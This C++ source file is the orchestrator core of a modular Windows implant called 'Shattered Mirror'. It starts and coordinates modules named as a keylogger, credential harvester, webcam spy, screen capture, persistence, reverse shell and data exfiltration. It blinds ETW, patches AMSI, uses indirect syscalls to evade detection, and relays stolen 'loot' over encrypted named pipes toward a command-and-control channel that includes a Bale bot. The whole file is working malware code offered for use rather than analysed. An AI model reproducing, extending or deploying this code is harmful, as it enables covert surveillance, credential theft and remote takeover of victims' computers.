/*=============================================================================
 * Shattered Mirror v1 — Orchestrator: Atom Manager Core
 * OPTION B: Orchestrator hosts both command and report pipe servers.
 * FULLY FIXED: Dual pipes, immediate command send, report forwarding.
 *===========================================================================*/

#include "AtomManager.h"
#ifdef ATOM_1_ENABLED
#include "../Atoms/Atom_01_Net.h"
#endif
#ifdef ATOM_2_ENABLED
#include "../Atoms/Atom_02_Key.h"
#endif
#ifdef ATOM_3_ENABLED
#include "../Atoms/Atom_03_Sys.h"
#endif
#ifdef ATOM_4_ENABLED
#include "../Atoms/Atom_04_AMSI.h"
#endif
#ifdef ATOM_5_ENABLED
#include "../Atoms/Atom_05_Exfil.h"
#endif
#ifdef ATOM_6_ENABLED
#include "../Atoms/Atom_06_Screen.h"
#endif
#ifdef ATOM_7_ENABLED
#include "../Atoms/Atom_07_Persist.h"
#endif
#ifdef ATOM_8_ENABLED
#include "../Atoms/Atom_08_Proc.h"
#endif
#ifdef ATOM_9_ENABLED
#include "../Atoms/Atom_09_FileSys.h"
#endif
#ifdef ATOM_10_ENABLED
#include "../Atoms/Atom_10_Shell.h"
#endif
#ifdef ATOM_11_ENABLED
#include "../Atoms/Atom_11_Ping.h"
#endif
#ifdef ATOM_12_ENABLED
#include "../Atoms/Atom_12_Bale.h"
#endif
#ifdef ATOM_13_ENABLED
#include "../Atoms/Atom_13_Creds.h"
#endif
#ifdef ATOM_14_ENABLED
#include "../Atoms/Atom_14_Spy.h"
#endif
#include "../Evasion_Suite/include/etw_blind.h"
#include "../Evasion_Suite/include/indirect_syscall.h"
#include "Config.h"
#include "Logger.h"
#include <cstdio>
#include <string>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

extern SYSCALL_TABLE g_SyscallTable;

static BYTE s_SessionKey[16] = {0};
DWORD WINAPI IpcListenerThread(LPVOID lpParam);

static ATOM_RECORD s_Atoms[MAX_ATOMS] = {0};

// Global handle to Atom 1's report pipe for forwarding non‑Bale reports
static HANDLE g_hNetworkReportPipe = NULL;

extern BOOL InstallAMSIBypass(void);
extern DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam);
extern DWORD WINAPI SpyCamAtomMain(LPVOID lpParam);

#define MAX_RESULT_QUEUE 128
static std::string s_ResultQueue[MAX_RESULT_QUEUE];
static int s_QueueCount = 0;

// --------------------------------------------------------------------------
// Debug trace for listener
// --------------------------------------------------------------------------
static void ListenerTrace(DWORD atomId, const char *format, ...) {
  char buf[512];
  va_list args;
  va_start(args, format);
  int len = vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  if (len > 0) {
    char full[600];
    sprintf_s(full, "[LSN %lu] %s\n", atomId, buf);
    OutputDebugStringA(full);
    FILE *f = fopen("log\\listener_debug.txt", "a");
    if (f) {
      fprintf(f, "[%lu] Atom %lu: %s\n", GetTickCount(), atomId, buf);
      fclose(f);
    }
  }
}

static void QueueResult(const std::string &result) {
  if (s_QueueCount < MAX_RESULT_QUEUE) {
    s_ResultQueue[s_QueueCount++] = result;
    Logger::Log(INFO, "Result queued. Depth: " + std::to_string(s_QueueCount));
  } else {
    Logger::Log(ERROR_LOG, "Result queue full.");
  }
}

static void Base64Encode(const BYTE *pBuf, DWORD dwLen, char *szOut) {
  if (!pBuf || !szOut)
    return;
  static const char cb64[] =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  int i, j;
  for (i = 0, j = 0; i < (int)dwLen; i += 3) {
    int v = pBuf[i];
    v = (v << 8) | (i + 1 < (int)dwLen ? pBuf[i + 1] : 0);
    v = (v << 8) | (i + 2 < (int)dwLen ? pBuf[i + 2] : 0);
    szOut[j++] = cb64[(v >> 18) & 0x3F];
    szOut[j++] = cb64[(v >> 12) & 0x3F];
    if (i + 1 < (int)dwLen)
      szOut[j++] = cb64[(v >> 6) & 0x3F];
    else
      szOut[j++] = '=';
    if (i + 2 < (int)dwLen)
      szOut[j++] = cb64[v & 0x3F];
    else
      szOut[j++] = '=';
  }
  szOut[j] = '\0';
}

BOOL SendHeartbeat() {
  if (g_hNetworkReportPipe && g_hNetworkReportPipe != INVALID_HANDLE_VALUE) {
    return TRUE;
  }
  return FALSE;
}

std::string FetchTask() { return ""; }

// --------------------------------------------------------------------------
// SendTaskResult: Forward reports to Atom 1 (Network) for exfiltration to C2
// --------------------------------------------------------------------------
void SendTaskResult(DWORD atomId, std::string result, DWORD commandId = CMD_FORWARD_REPORT) {
  if (g_hNetworkReportPipe && g_hNetworkReportPipe != INVALID_HANDLE_VALUE) {
    IPC_MESSAGE fwd = {0};
    fwd.dwSignature = 0x534D4952;
    fwd.CommandId = (ATOM_COMMAND_ID)commandId;
    fwd.AtomId = atomId;
    fwd.dwPayloadLen = (DWORD)result.length();
    memcpy(fwd.Payload, result.c_str(), fwd.dwPayloadLen);
    if (!IPC_SendMessage(g_hNetworkReportPipe, &fwd, s_SessionKey, 16)) {
      Logger::Log(ERROR_LOG, "Failed to forward report to Atom 1");
      QueueResult(result);
    }
  } else {
    QueueResult(result);
  }
}

void FlushResultQueue() { /* ... */ }

// --------------------------------------------------------------------------
// QueueAtomCommand: Stores command and sends immediately via command pipe if
// atom is running.
// --------------------------------------------------------------------------
void QueueAtomCommand(DWORD atomId, const char *command, DWORD len) {
  if (atomId <= 0 || atomId > 14)
    return;
  if (len >= MAX_IPC_PAYLOAD_SIZE)
    len = MAX_IPC_PAYLOAD_SIZE - 1;

  Logger::Log(INFO, "Queued command for Atom " + std::to_string(atomId) + ": " +
                        std::string(command, len));

  // Store as pending (fallback)
  memcpy(s_Atoms[atomId].pendingCommand, command, len);
  s_Atoms[atomId].pendingCommand[len] = '\0';
  s_Atoms[atomId].pendingCommandLen = len;

  // If atom is running and we have its command pipe, send immediately
  if (s_Atoms[atomId].Status == ATOM_STATUS_RUNNING &&
      s_Atoms[atomId].hCmdPipe) {
    ListenerTrace(atomId, "Sending immediate command via hCmdPipe (len=%lu)",
                  len);
    IPC_MESSAGE cmdMsg = {0};
    cmdMsg.dwSignature = 0x534D4952;
    cmdMsg.CommandId = CMD_EXECUTE;
    cmdMsg.dwPayloadLen = len;
    memcpy(cmdMsg.Payload, command, len);
    if (IPC_SendMessage(s_Atoms[atomId].hCmdPipe, &cmdMsg, s_SessionKey, 16)) {
      ListenerTrace(atomId, "Immediate command sent successfully");
      s_Atoms[atomId].pendingCommandLen = 0; // Clear pending since sent
    } else {
      ListenerTrace(atomId,
                    "Immediate command send failed, keeping in pending");
    }
  } else {
    ListenerTrace(atomId,
                  "Atom not running or no cmd pipe; command stored as pending");
  }
}

static BOOL SpawnAtomById(DWORD atom_id, const char *initialCommand = NULL,
                          DWORD cmdLen = 0) {
  if (atom_id <= 0 || atom_id > 14)
    return FALSE;
  if (s_Atoms[atom_id].Status == ATOM_STATUS_RUNNING) {
    Logger::Log(INFO, "Atom " + std::to_string(atom_id) + " already running.");
    if (initialCommand && cmdLen > 0) {
      QueueAtomCommand(atom_id, initialCommand, cmdLen);
    }
    return TRUE;
  }
  Logger::Log(SUCCESS,
              "Initiating ATOM " + std::to_string(atom_id) + " Deployment...");
  s_Atoms[atom_id].dwAtomId = atom_id;
  s_Atoms[atom_id].Status = ATOM_STATUS_STARTING;
  if (initialCommand && cmdLen > 0) {
    QueueAtomCommand(atom_id, initialCommand, cmdLen);
  }
  HANDLE hThread = NULL;
  switch (atom_id) {
#ifdef ATOM_1_ENABLED
  case 1:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NetworkAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_2_ENABLED
  case 2:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyloggerAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_3_ENABLED
  case 3:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SystemInfoAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_4_ENABLED
  case 4:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AMSIBypassAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_5_ENABLED
  case 5:
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExfiltrationAtomMain,
                     (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_6_ENABLED
  case 6:
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ScreenCaptureAtomMain,
                     (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_7_ENABLED
  case 7:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PersistenceAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_8_ENABLED
  case 8:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ProcessAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_9_ENABLED
  case 9:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FileSystemAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_10_ENABLED
  case 10:
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReverseShellAtomMain,
                     (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_11_ENABLED
  case 11:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PingAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_12_ENABLED
  case 12:
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BaleBotAtomMain,
                           (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_13_ENABLED
  case 13:
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CredentialHarvesterAtomMain,
                     (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
#ifdef ATOM_14_ENABLED
  case 14:
    hThread =
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SpyCamAtomMain,
                     (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    break;
#endif
  }
  if (hThread) {
    Logger::Log(INFO, "Telemetry bridge established for Atom " +
                          std::to_string(atom_id));
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IpcListenerThread,
                 (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
    int timeout = 50;
    while (s_Atoms[atom_id].Status != ATOM_STATUS_RUNNING && timeout-- > 0)
      Sleep(100);
  }
  return (s_Atoms[atom_id].Status == ATOM_STATUS_RUNNING);
}

BOOL SpawnAtomFromTask(std::string json) { return TRUE; }

void StartAutoAtoms(void) {
  Logger::Log(INFO, "Starting auto‑run atoms...");
  for (int i = 0; i < Config::AUTO_START_COUNT; i++) {
    DWORD id = Config::AUTO_START_ATOMS[i];
    if (SpawnAtomById(id))
      Logger::Log(SUCCESS, "Auto‑started Atom " + std::to_string(id));
    else
      Logger::Log(ERROR_LOG, "Failed to auto‑start Atom " + std::to_string(id));
    Sleep(1500 + (rand() % 501)); // Random delay between 1.5s and 2.0s
  }
}

BOOL StopAtomById(DWORD atom_id) {
  if (atom_id <= 0 || atom_id > 14)
    return FALSE;
  if (s_Atoms[atom_id].Status != ATOM_STATUS_RUNNING) {
    Logger::Log(INFO, "Atom " + std::to_string(atom_id) + " is not running.");
    return FALSE;
  }
  Logger::Log(INFO, "Stopping Atom " + std::to_string(atom_id) + "...");
  if (s_Atoms[atom_id].hCmdPipe) {
    IPC_MESSAGE termMsg = {0};
    termMsg.dwSignature = 0x534D4952;
    termMsg.CommandId = CMD_TERMINATE;
    IPC_SendMessage(s_Atoms[atom_id].hCmdPipe, &termMsg, s_SessionKey, 16);
  }
  s_Atoms[atom_id].Status = ATOM_STATUS_DEAD;
  return TRUE;
}

std::string ListRunningAtoms() {
  std::string list = "Running atoms:\n";
  for (int i = 1; i < MAX_ATOMS; i++)
    if (s_Atoms[i].Status == ATOM_STATUS_RUNNING)
      list += "Atom " + std::to_string(i) + "\n";
  return list;
}

// ===== LISTENER THREAD FOR DUAL PIPES (Option B) =====
DWORD WINAPI IpcListenerThread(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  ListenerTrace(dwAtomId, "Listener thread starting");

  // 1. Create report pipe server (receives reports from atom)
  HANDLE hReportPipe = IPC_CreateReportServerPipe(dwAtomId);
  if (!hReportPipe) {
    ListenerTrace(dwAtomId, "Failed to create report server pipe");
    s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
    return 1;
  }

  // 2. Create command pipe server (sends commands to atom)
  HANDLE hCmdPipe = IPC_CreateCommandServerPipe(dwAtomId);
  if (!hCmdPipe) {
    ListenerTrace(dwAtomId, "Failed to create command server pipe");
    CloseHandle(hReportPipe);
    s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
    return 1;
  }

  // Store handles
  s_Atoms[dwAtomId].hReportPipe = hReportPipe;
  s_Atoms[dwAtomId].hCmdPipe = hCmdPipe;

  // Store Atom 1's report pipe for forwarding
  if (dwAtomId == 1) {
    g_hNetworkReportPipe = hReportPipe;
    ListenerTrace(dwAtomId, "Network report pipe handle stored");
  }

  // Wait for atom to connect to report pipe
  ListenerTrace(dwAtomId, "Waiting for atom to connect to report pipe %p",
                hReportPipe);
  if (!ConnectNamedPipe(hReportPipe, NULL) &&
      GetLastError() != ERROR_PIPE_CONNECTED) {
    ListenerTrace(dwAtomId, "ConnectNamedPipe(report) failed, error=%lu",
                  GetLastError());
    CloseHandle(hReportPipe);
    CloseHandle(hCmdPipe);
    s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
    return 1;
  }
  ListenerTrace(dwAtomId, "Atom connected to report pipe");

  // Wait for atom to connect to command pipe
  ListenerTrace(dwAtomId, "Waiting for atom to connect to command pipe %p",
                hCmdPipe);
  if (!ConnectNamedPipe(hCmdPipe, NULL) &&
      GetLastError() != ERROR_PIPE_CONNECTED) {
    ListenerTrace(dwAtomId, "ConnectNamedPipe(cmd) failed, error=%lu",
                  GetLastError());
    CloseHandle(hReportPipe);
    CloseHandle(hCmdPipe);
    s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
    return 1;
  }
  ListenerTrace(dwAtomId, "Atom connected to command pipe");

  s_Atoms[dwAtomId].Status = ATOM_STATUS_RUNNING;
  s_Atoms[dwAtomId].dwLastHeartbeat = GetTickCount();

  Logger::Log(SUCCESS,
              "IPC Bridges ONLINE for Atom " + std::to_string(dwAtomId) +
                  " | Report Pipe: " + std::to_string((ULONG_PTR)hReportPipe) +
                  " | Command Pipe: " + std::to_string((ULONG_PTR)hCmdPipe));

  // Main loop: read and process reports from hReportPipe
  while (s_Atoms[dwAtomId].Status == ATOM_STATUS_RUNNING) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hReportPipe, NULL, 0, NULL, &dwAvail, NULL) &&
        dwAvail > 0) {
      IPC_MESSAGE msg = {0};
      if (IPC_ReceiveMessage(hReportPipe, &msg, s_SessionKey, 16)) {
        s_Atoms[dwAtomId].dwLastHeartbeat = GetTickCount();
        ListenerTrace(dwAtomId, "Received cmd=%d, payload=%lu on report pipe",
                      msg.CommandId, msg.dwPayloadLen);
        Logger::Log(INFO, "Received cmd=" + std::to_string(msg.CommandId) + " from Atom " + std::to_string(dwAtomId));

        // --- CMD_SPAWN_ATOM (from Bale) ---
        if (msg.CommandId == CMD_SPAWN_ATOM) {
          std::string payload((char *)msg.Payload, msg.dwPayloadLen);
          Logger::Log(INFO, "Received CMD_SPAWN_ATOM from Atom " +
                                std::to_string(dwAtomId) + ": " + payload);
          size_t colonPos = payload.find(':');
          DWORD targetAtomId = 0;
          std::string args;
          if (colonPos != std::string::npos) {
            targetAtomId = (DWORD)std::stoul(payload.substr(0, colonPos));
            args = payload.substr(colonPos + 1);
          } else {
            targetAtomId = (DWORD)std::stoul(payload);
          }

          if (args == "STOP" || args == "TERMINATE") {
            StopAtomById(targetAtomId);
            IPC_MESSAGE ack = {0};
            ack.dwSignature = 0x534D4952;
            ack.CommandId = CMD_FORWARD_REPORT;
            ack.AtomId = targetAtomId;
            std::string ackPayload = "STOPPED:" + std::to_string(targetAtomId);
            ack.dwPayloadLen = (DWORD)ackPayload.length();
            memcpy(ack.Payload, ackPayload.c_str(), ack.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &ack, s_SessionKey, 16);
            continue;
          }

          if (s_Atoms[targetAtomId].Status == ATOM_STATUS_RUNNING) {
            Logger::Log(INFO, "Atom " + std::to_string(targetAtomId) +
                                  " already running. Sending command.");
            s_Atoms[targetAtomId].bBaleRouted = TRUE;
            s_Atoms[targetAtomId].hBalePipe = hReportPipe;
            if (!args.empty()) {
              QueueAtomCommand(targetAtomId, args.c_str(),
                               (DWORD)args.length());
            }
            IPC_MESSAGE ack = {0};
            ack.dwSignature = 0x534D4952;
            ack.CommandId = CMD_FORWARD_REPORT;
            ack.AtomId = targetAtomId;
            std::string ackPayload = "ACK:" + std::to_string(targetAtomId);
            ack.dwPayloadLen = (DWORD)ackPayload.length();
            memcpy(ack.Payload, ackPayload.c_str(), ack.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &ack, s_SessionKey, 16);
            continue;
          }

          s_Atoms[targetAtomId].bBaleRouted = TRUE;
          s_Atoms[targetAtomId].hBalePipe = hReportPipe;
          if (SpawnAtomById(targetAtomId, args.c_str(),
                            (DWORD)args.length())) {
            IPC_MESSAGE ack = {0};
            ack.dwSignature = 0x534D4952;
            ack.CommandId = CMD_FORWARD_REPORT;
            ack.AtomId = targetAtomId;
            std::string ackPayload = "ACK:" + std::to_string(targetAtomId);
            ack.dwPayloadLen = (DWORD)ackPayload.length();
            memcpy(ack.Payload, ackPayload.c_str(), ack.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &ack, s_SessionKey, 16);
          } else {
            IPC_MESSAGE nack = {0};
            nack.dwSignature = 0x534D4952;
            nack.CommandId = CMD_FORWARD_REPORT;
            nack.AtomId = targetAtomId;
            std::string nackPayload = "NACK:" + std::to_string(targetAtomId);
            nack.dwPayloadLen = (DWORD)nackPayload.length();
            memcpy(nack.Payload, nackPayload.c_str(), nack.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &nack, s_SessionKey, 16);
          }
          continue;
        }

        // --- CMD_READY (from atom) ---
        if (msg.CommandId == CMD_READY) {
          ListenerTrace(dwAtomId, "CMD_READY received");
          Logger::Log(INFO, "Received CMD_READY from Atom " +
                                std::to_string(dwAtomId));
          if (s_Atoms[dwAtomId].pendingCommandLen > 0 &&
              s_Atoms[dwAtomId].hCmdPipe) {
            ListenerTrace(dwAtomId,
                          "Sending pending command on CMD_READY (len=%lu)",
                          s_Atoms[dwAtomId].pendingCommandLen);
            IPC_MESSAGE cmdMsg = {0};
            cmdMsg.dwSignature = 0x534D4952;
            cmdMsg.CommandId = CMD_EXECUTE;
            cmdMsg.dwPayloadLen = s_Atoms[dwAtomId].pendingCommandLen;
            memcpy(cmdMsg.Payload, s_Atoms[dwAtomId].pendingCommand,
                   cmdMsg.dwPayloadLen);
            if (IPC_SendMessage(s_Atoms[dwAtomId].hCmdPipe, &cmdMsg,
                                s_SessionKey, 16)) {
              ListenerTrace(dwAtomId, "Pending command sent");
              s_Atoms[dwAtomId].pendingCommandLen = 0;
            }
          }
          continue;
        }

        // --- CMD_REPORT (from atom) ---
        if (msg.CommandId == CMD_REPORT) {
          std::string loot((char *)msg.Payload, msg.dwPayloadLen);
          ListenerTrace(dwAtomId, "REPORT received, size=%lu",
                        msg.dwPayloadLen);
          Logger::Log(INFO, "REPORT from Atom " + std::to_string(dwAtomId) +
                                ", size: " + std::to_string(msg.dwPayloadLen));

          if (s_Atoms[dwAtomId].bBaleRouted &&
              s_Atoms[dwAtomId].hBalePipe != NULL) {
            IPC_MESSAGE fwd = {0};
            fwd.dwSignature = 0x534D4952;
            fwd.CommandId = CMD_FORWARD_REPORT;
            fwd.AtomId = dwAtomId;
            fwd.dwPayloadLen = msg.dwPayloadLen;
            memcpy(fwd.Payload, msg.Payload, msg.dwPayloadLen);
            if (IPC_SendMessage(s_Atoms[dwAtomId].hBalePipe, &fwd,
                                s_SessionKey, 16)) {
              ListenerTrace(dwAtomId, "Forwarded report to Bale");
            } else {
              ListenerTrace(dwAtomId, "Failed to forward report to Bale");
            }
          } else {
            SendTaskResult(dwAtomId, loot, CMD_FORWARD_REPORT);
          }

          IPC_MESSAGE ackMsg = {0};
          ackMsg.dwSignature = 0x534D4952;
          ackMsg.CommandId = CMD_REPORT_ACK;
          ackMsg.dwPayloadLen = 0;
          IPC_SendMessage(s_Atoms[dwAtomId].hCmdPipe, &ackMsg, s_SessionKey, 16);
          continue;
        }

        // --- CMD_FORWARD_REPORT (from atom directly) ---
        if (msg.CommandId == CMD_FORWARD_REPORT) {
          std::string loot((char *)msg.Payload, msg.dwPayloadLen);
          ListenerTrace(dwAtomId, "FORWARD_REPORT received, size=%lu", msg.dwPayloadLen);
          SendTaskResult(dwAtomId, loot, CMD_FORWARD_REPORT);
          continue;
        }

        // Unknown command — log and ignore
        ListenerTrace(dwAtomId, "Unknown command %d, ignoring",
                      msg.CommandId);
      } else {
        // IPC_ReceiveMessage failed — data was available but couldn't parse
        ListenerTrace(dwAtomId, "IPC_ReceiveMessage failed, possible corrupt data");
      }
    } else {
      DWORD err = GetLastError();
      if (err == ERROR_BROKEN_PIPE) {
        ListenerTrace(dwAtomId, "Report pipe broken, exiting listener");
        break;
      }
    }
    Sleep(50);
  }

  ListenerTrace(dwAtomId, "Listener thread exiting");
  Logger::Log(ERROR_LOG,
              "IPC Link SEVERED for Atom " + std::to_string(dwAtomId));
  s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
  CloseHandle(hReportPipe);
  CloseHandle(hCmdPipe);
  return 0;
}

BOOL InitAtomManager(void) {
  Logger::Log(INFO, "Initializing Orchestrator subsystems...");
  if (!Logger::Verify("Syscall Table Init", InitSyscallTable(&g_SyscallTable)))
    return FALSE;
#if defined(FEATURE_ETW_BLIND_ENABLED)
  if (Config::ENABLE_ETW_BLIND) {
    Logger::Log(INFO, "Blinding ETW...");
    BlindETW(&g_SyscallTable);
  }
#endif
#if defined(FEATURE_AMSI_BYPASS_ENABLED) && defined(FEATURE_VEH_HANDLER_ENABLED)
  if (Config::ENABLE_AMSI_BYPASS) {
    Logger::Log(INFO, "Patching AMSI...");
    InstallAMSIBypass();
  }
#endif
  memcpy(s_SessionKey, Config::PSK_ID, 16);
  for (int i = 0; i < MAX_ATOMS; i++) {
    s_Atoms[i].Status = ATOM_STATUS_UNINITIALIZED;
    s_Atoms[i].bBaleRouted = FALSE;
    s_Atoms[i].hBalePipe = NULL;
    s_Atoms[i].hReportPipe = NULL;
    s_Atoms[i].hCmdPipe = NULL;
    s_Atoms[i].pendingCommandLen = 0;
    memset(s_Atoms[i].pendingCommand, 0, MAX_IPC_PAYLOAD_SIZE);
  }
  return TRUE;
}

DWORD WINAPI OrchestratorMain(LPVOID lpParam) {
  Logger::Init(Config::LOG_FILE_PATH, Config::ENABLE_DEBUG_CONSOLE);
  Logger::Log(INFO, "--- SHATTERED MIRROR: ORCHESTRATOR ONLINE ---");
  if (!InitAtomManager()) {
    Logger::Shutdown();
    return 1;
  }
  SendHeartbeat();
  StartAutoAtoms();
  while (TRUE) {
    Sleep(2000);
    FlushResultQueue();
  }
  Logger::Shutdown();
  return 0;
}